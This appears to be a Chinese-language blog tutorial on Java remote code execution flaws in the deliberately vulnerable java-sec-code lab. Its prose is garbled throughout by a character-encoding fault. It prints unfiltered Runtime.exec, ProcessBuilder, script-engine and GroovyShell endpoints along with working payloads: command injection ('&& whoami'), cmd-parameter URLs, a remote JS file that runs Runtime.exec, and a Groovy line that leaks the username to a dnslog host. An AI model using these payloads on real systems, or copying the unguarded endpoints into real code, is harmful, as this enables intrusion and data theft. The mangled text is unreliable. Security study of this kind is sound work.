---
layout: post
title: 'Javaå®‰å…¨_RCEæ¼æ´'
date: "2025-06-07T00:41:46Z"
---
Javaå®‰å…¨\_RCEæ¼æ´
=============

> \[!NOTE\]
> 
> æœ¬æ¬¡å­¦ä¹ ä½¿ç”¨å¼€æºé¡¹ç›®ï¼š  
> [https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SQLI.java](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SQLI.java)
> 
> ä½¿ç”¨å·¥å…·ï¼š  
> æµè§ˆå™¨
> 
> IDEA

ç›®å½•

*   [âœ… ä»€ä¹ˆæ˜¯ RCE æ¼æ´ï¼Ÿ](#-ä»€ä¹ˆæ˜¯-rce-æ¼æ´)
*   [ğŸ¯ å…¸å‹æ”»å‡»åœºæ™¯](#-å…¸å‹æ”»å‡»åœºæ™¯)
    *   *   [å‘½ä»¤æ³¨å…¥](#å‘½ä»¤æ³¨å…¥)
*   [ğŸ¤ä»¥ä¸‹ä¸ºé›†ä¸­å…¸å‹RCEæ¼æ´ä»£ç åœºæ™¯](#ä»¥ä¸‹ä¸ºé›†ä¸­å…¸å‹rceæ¼æ´ä»£ç åœºæ™¯)
*   [1ã€Runtime](#1runtime)
*   [**ä¸ºä»€ä¹ˆRuntime.getRuntimeæ— æ³•ç›´æ¥æ‰§è¡Œ`dir`ï¼Œè€Œæ˜¯`cmd /c dir`?**](#ä¸ºä»€ä¹ˆruntimegetruntimeæ— æ³•ç›´æ¥æ‰§è¡Œdirè€Œæ˜¯cmd-c-dir)
*   [2ã€ProcessBuilder](#2processbuilder)
*   [3ã€ScriptEngineManager](#3scriptenginemanager)
*   [4ã€Groovy](#4groovy)

âœ… ä»€ä¹ˆæ˜¯ RCE æ¼æ´ï¼Ÿ
=============

RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰æŒ‡çš„æ˜¯ï¼š

> æ”»å‡»è€…åˆ©ç”¨æœåŠ¡å™¨åº”ç”¨ç¨‹åºä¸­çš„æŸäº›æ¼æ´ï¼Œå°†æ¶æ„ä»£ç ä¼ è¾“åˆ°æœåŠ¡å™¨ï¼Œå¹¶åœ¨æœåŠ¡å™¨ä¸Š**ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œè¿™äº›ä»£ç **ã€‚

ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯æ”»å‡»è€…â€œè¿œç¨‹æ§åˆ¶æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤â€ï¼Œå¯ä»¥åšå‡ ä¹**ä»»ä½•æ“ä½œ**ï¼š

*   è¯»å†™æ–‡ä»¶
*   è¿œç¨‹æ§åˆ¶
*   æ·»åŠ åé—¨
*   çªƒå–æ•°æ®åº“æ•°æ®
*   æ¨ªå‘æ¸—é€ã€å†…ç½‘æ‰“ç‚¹

ğŸ¯ å…¸å‹æ”»å‡»åœºæ™¯
=========

ä»¥ä¸‹æ˜¯å‡ ç§å¸¸è§å¯¼è‡´ RCE æ¼æ´çš„åœºæ™¯ï¼š

* * *

### å‘½ä»¤æ³¨å…¥

Java ä¸­ä½¿ç”¨ `Runtime.exec()` æˆ– `ProcessBuilder` æ—¶æ‹¼æ¥äº†ç”¨æˆ·è¾“å…¥ï¼š

    String cmd = "ping " + userInput;
    Runtime.getRuntime().exec(cmd);
    

å¦‚æœç”¨æˆ·è¾“å…¥çš„æ˜¯ï¼š

    127.0.0.1 && whoami
    

æœ€ç»ˆæ‰§è¡Œå‘½ä»¤ä¸ºï¼š

    ping 127.0.0.1 && whoami
    

æœåŠ¡å™¨ä¼šåœ¨ ping åæ‰§è¡Œ `whoami`ï¼Œæ³„éœ²ç³»ç»Ÿèº«ä»½ã€‚

ğŸ¤ä»¥ä¸‹ä¸ºé›†ä¸­å…¸å‹RCEæ¼æ´ä»£ç åœºæ™¯
==================

1ã€Runtime
=========

    @RequestMapping("/rce")
    public class Rce {
        @GetMapping("/runtime/exec")
        public String CommandExec(String cmd) {
            Runtime run = Runtime.getRuntime();
            StringBuilder sb = new StringBuilder();
    
            try {
                Process p = run.exec(cmd);
                BufferedInputStream in = new BufferedInputStream(p.getInputStream());
                BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
                String tmpStr;
    
                while ((tmpStr = inBr.readLine()) != null) {
                    sb.append(tmpStr);
                }
    
                if (p.waitFor() != 0) {
                    if (p.exitValue() == 1)
                        return "Command exec failed!!";
                }
    
                inBr.close();
                in.close();
            } catch (Exception e) {
                return e.toString();
            }
            return sb.toString();
        }
    }
    

é€šè¿‡æŸ¥çœ‹ä»£ç å‘ç°ï¼Œè¿›å…¥å‡½æ•°æ‰§è¡Œçš„URiä¸º `/rce/runtime/exec`

    @RequestMapping("/rce")
    public class Rce {
        @GetMapping("/runtime/exec")
        public String CommandExec(String cmd) {
    

ä¼ å…¥å‚æ•°ä¸ºcmdï¼Œå› æ­¤æ„é€ payload`http://127.0.0.1:8081/rce/runtime/exec?cmd=cmd /c dir`

è¿™æ®µä»£ç **å®Œå…¨æ²¡æœ‰å¯¹ç”¨æˆ·ä¼ å…¥çš„ `cmd` å‚æ•°åšä»»ä½•æ ¡éªŒæˆ–è¿‡æ»¤**ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æµè§ˆå™¨æˆ– HTTP å®¢æˆ·ç«¯æ„é€ å¦‚ä¸‹ URLï¼Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

    public String CommandExec(String cmd) {
            Runtime run = Runtime.getRuntime();
            StringBuilder sb = new StringBuilder();
    
            try {
                Process p = run.exec(cmd);
            }
    

**ä¸ºä»€ä¹ˆRuntime.getRuntimeæ— æ³•ç›´æ¥æ‰§è¡Œ`dir`ï¼Œè€Œæ˜¯`cmd /c dir`?**
====================================================

_**ç†è§£è¿™ä¸ªå¾ˆé‡è¦**_

_Runtime.getRuntime.execçš„éƒ¨åˆ†è°ƒç”¨é“¾_

    Runtime.getRuntime.exec()
    	java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)
    		java.lang.ProcessBuilder#start
    			java.lang.SecurityManager#checkExec
        			java.lang.ProcessImpl#ProcessImpl
    

å…¶ä¸­å¦‚ä¸‹`java.lang.ProcessBuilder#start`éƒ¨åˆ†ä»£ç å¦‚ä¸‹

     public Process start() throws IOException {
            // Must convert to array first -- a malicious user-supplied
            // list might try to circumvent the security check.
            String[] cmdarray = command.toArray(new String[command.size()]);
            cmdarray = cmdarray.clone();
    
            for (String arg : cmdarray)
                if (arg == null)
                    throw new NullPointerException();
            // Throws IndexOutOfBoundsException if command is empty
            String prog = cmdarray[0];  //è¿™é‡Œä¼šæ‰¾åˆ°["cmd","/c","dir"]ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯cmdï¼Œç„¶åä¸¢ç»™security.checkExec(prog);
            SecurityManager security = System.getSecurityManager();
            if (security != null)
                security.checkExec(prog);
    

å…¶ä¸­çš„`java.lang.SecurityManager#checkExec`å¦‚ä¸‹

        public void checkExec(String cmd) {
            File f = new File(cmd);
            if (f.isAbsolute()) {
                checkPermission(new FilePermission(cmd,
                    SecurityConstants.FILE_EXECUTE_ACTION));
            } else {
                checkPermission(new FilePermission("<<ALL FILES>>",
                    SecurityConstants.FILE_EXECUTE_ACTION));
            }
        }
    

å…¶ä¸­çš„`java.lang.ProcessImpl#ProcessImpl`éƒ¨åˆ†ä»£ç å¦‚ä¸‹

            if (allowAmbiguousCommands && security == null) {
                // Legacy mode.
    
                // Normalize path if possible.
                String executablePath = new File(cmd[0]).getPath();
    
                // No worry about internal, unpaired ["], and redirection/piping.
                if (needsEscaping(VERIFICATION_LEGACY, executablePath) )
                    executablePath = quoteString(executablePath);
    
                cmdstr = createCommandLine(
                    //legacy mode doesn't worry about extended verification
                    VERIFICATION_LEGACY,
                    executablePath,
                    cmd);
            } else {
                String executablePath;
                try {
                    executablePath = getExecutablePath(cmd[0]);
                }
    

ç»è¿‡åˆ†æå¯ä»¥çŸ¥é“ï¼Œ`Runtime.getRuntime().exec(cmd)`çš„å‘½ä»¤æ‰§è¡Œè·¯å¾„å¤§è‡´ä¸º

    Runtime --> ProcessBuilder --> ProcessImpl
    

å…¶ä¸­ï¼Œ**å‘½ä»¤`cmd /c dir`ä¼šè¢«è½¬ä¸ºListæ•°ç»„**ï¼Œå…¶ä¸­æ•°ç»„çš„**ç¬¬ä¸€ä¸ªå…ƒç´ `cmd`ä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°**ï¼Œæœ€ç»ˆå°†å¯æ‰§è¡Œæ–‡ä»¶åç§°äº¤ç»™**ProcessBuilder**è¿›è¡Œä¸‹ä¸€æ­¥è°ƒç”¨

é‚£ä¹ˆå¯ä»¥å¾—å‡ºç»“è®ºï¼šç¬¬ä¸€ä¸ªå…ƒç´ çš„åå­—å¿…é¡»èƒ½åœ¨`ç³»ç»Ÿå˜é‡Path`ä¸­æ‰¾åˆ°ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ä½¿ç”¨dirç­‰å‘½ä»¤çš„åŸå› äº†

å¦‚ç³»ç»Ÿå˜é‡Pathä¸­æœ‰Bandizipçš„ç›®å½•ï¼Œé‚£ä¹ˆä¼ å…¥`http://localhost:8081/rce/runtime/exec?cmd=Bandizip`ï¼ŒæˆåŠŸæ‰§è¡ŒBandizip

![](https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250606192712946-1706728764.png)

2ã€ProcessBuilder
================

ProcessBuilderé¡¾åæ€ä¹‰ä¸ºè¿›ç¨‹æ„å»ºå™¨ï¼Œå‡½æ•°æ¥æ”¶åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªStringç±»å‹å…ƒç´ çš„Listï¼Œæˆ–è€…Stringç±»å‹çš„å¯å˜å‚æ•°

æ•°ç»„çš„**ç¬¬ä¸€ä¸ª**å…ƒç´ ä¸ºè¦æ‰§è¡Œçš„åº”ç”¨ç¨‹åºçš„åç§°ï¼Œåç»­å…ƒç´ ä¸º**æ‰§è¡Œæ—¶çš„å‚æ•°**

åœ¨Windowsä¸­ï¼Œé»˜è®¤ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcmdï¼ŒLinuxä¸­åˆ™éœ€è¦æ‰‹åŠ¨æŒ‡å®š

    @RequestMapping("/rce")
    public class Rce {
    @GetMapping("/ProcessBuilder")
        public String processBuilder(String cmd) {
    
            StringBuilder sb = new StringBuilder();
    
            try {
               // String[] arrCmd = {"/bin/sh", "-c", cmd};  //linux
                String[] arrCmd = {cmd};                 //windows,windosä¸‹æ— éœ€æŒ‡å®š
                ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
                Process p = processBuilder.start();
                BufferedInputStream in = new BufferedInputStream(p.getInputStream());
                BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
                String tmpStr;
                while ((tmpStr = inBr.readLine()) != null) {
                    sb.append(tmpStr);
                }
            } catch (Exception e) {
                return e.toString();
            }
    
            return sb.toString();
        }
    }
    

é€šè¿‡æŸ¥çœ‹ä»£ç å‘ç°ï¼Œå‘½ä»¤æ‰§è¡Œéƒ¨åˆ†å¦‚ä¸‹ï¼Œä¸”å‘ç°ä»cmdå‚æ•°ä¼ å…¥ï¼Œä¸€ç›´åˆ°processBuilder.start()éƒ½æ²¡æœ‰å¯¹æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œä»»ä½•è¿‡æ»¤

å› æ­¤ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶ä¼ å…¥cmdå‚æ•°æ‰§è¡Œæ”»å‡»è€…æƒ³è¦çš„ä»»ä½•å‘½ä»¤

            try {
               // String[] arrCmd = {"/bin/sh", "-c", cmd};  //linux
                String[] arrCmd = {cmd};                 //windows,windosä¸‹æ— éœ€æŒ‡å®š
                ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
                Process p = processBuilder.start();
    

æŸ¥çœ‹æ³¨é‡Šä¸Šçš„è·¯ç”±ï¼Œæ„é€ URiä¸º`http://localhost:8081/rce/ProcessBuilder?cmd=whoami`

æˆåŠŸæ‰§è¡Œå‘½ä»¤

![](https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250606192725926-640251246.png)

3ã€ScriptEngineManager
=====================

_**å­˜åœ¨æ¼æ´çš„ä»£ç **_

        @GetMapping("/jscmd")
        public void jsEngine(String jsurl) throws Exception{
            // js nashorn javascript ecmascript
            ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);//å¯åŠ¨javascriptå¼•æ“
            String cmd = String.format("load(\"%s\")", jsurl);
            engine.eval(cmd, bindings);
        }
    

åŠ è½½ä¸€ä¸ªJSå¼•æ“

            ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);//å¯åŠ¨javascriptå¼•æ“
    

ä½¿ç”¨JSå¼•æ“æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œä½¿ç”¨`load()`ä»è¿œç¨‹åŠ è½½JSæ–‡ä»¶

æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠæ¶æ„payloadå†™åœ¨è¿œç¨‹jsæ–‡ä»¶ä¸­ï¼Œç»ç”±JSå¼•æ“åŠ è½½ä¹‹åæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œè¿›è€Œå®ç°RCE

_**è¿œç¨‹æ¶æ„JSæ¨¡æ¿**_

    function mainOutput() {
        var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");
    }
    var a = mainOutput(); 
    

_**æ³¨æ„ï¼ï¼ï¼ï¼šæ ¹æ®ä¸åŒçš„Scriptå¼•æ“ï¼Œå¯èƒ½ä¼šæœ‰ä¸åŒçš„æ‰§è¡Œæ•ˆæœ**_

è¿™é‡Œèµ·ä¸€ä¸ªpython simple httpserverï¼Œç„¶åæ”¾å…¥æ¶æ„jsæ–‡ä»¶ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„Payload`http://localhost:8081/rce/jscmd?jsurl=http://127.0.0.1:9090/1.js`ï¼ŒæˆåŠŸæ‰§è¡Œæ¶æ„payload

![](https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250606192735436-1922201125.png)

4ã€Groovy
========

Groovy æ˜¯ä¸€ç§åŸºäº **Java å¹³å°**çš„ **åŠ¨æ€è„šæœ¬è¯­è¨€**ï¼Œè¯­æ³•ç®€æ´ã€çµæ´»ï¼Œå…¼å®¹ Javaï¼Œå¹¶èƒ½ä¸ Java æ— ç¼é›†æˆã€‚å¯ä»¥æŠŠ Groovy çœ‹æˆæ˜¯ â€œæ›´è½»é‡ã€æ›´çµæ´»çš„ Javaâ€ã€‚

å¦‚æœä¸å®‰å…¨çš„Groovyæ¥å£ç”±ç”¨æˆ·å¯æ§ï¼Œé‚£ä¹ˆå°±å¾ˆå®¹æ˜“é€ æˆRCEæ¼æ´

_ç¤ºä¾‹ä»£ç _

        @GetMapping("groovy")
        public void groovyshell(String content) {
            GroovyShell groovyShell = new GroovyShell();
            groovyShell.evaluate(content);
        }
    

ä¸Šè¿°ä»£ç å¼€å¯äº†ä¸€ä¸ªGroovyShellï¼Œå¹¶ä¸”æ‰§è¡Œçš„å‚æ•°ç”¨æˆ·å¯æ§

å› æ­¤å¯ä»¥æ„é€ Payloadæ‰§è¡ŒGroovyå‘½ä»¤ï¼Œæ„é€ 

    def cmd="cmd /c ping %USERNAME%.your.dnslog.cn"
    cmd.execute()
    

ç»è¿‡URLç¼–ç åä¸º

    def%20cmd%3D%22cmd%20/c%20ping%20%25USERNAME%25.your.dnslog.cn%22%0Acmd.execute%28%29
    

æœ€ç»ˆæˆåŠŸè§¦å‘DNSå›æ˜¾éªŒè¯

![](https://img2024.cnblogs.com/blog/2588316/202506/2588316-20250606192744740-1059375887.png)